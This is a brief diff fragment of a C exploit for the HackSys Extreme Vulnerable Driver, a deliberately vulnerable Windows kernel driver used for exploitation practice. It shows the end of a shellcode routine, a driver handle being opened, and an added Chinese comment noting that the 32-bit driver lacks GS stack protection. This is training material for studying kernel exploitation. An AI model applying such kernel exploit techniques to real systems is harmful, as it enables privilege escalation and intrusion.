@@ -31,6 +31,7 @@ VOID ShellCode()
 		ret 8
 	}
 }
+//在32位的hevd的驱动并没有开启gs
 int main() {
 	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 	HANDLE hDevice;
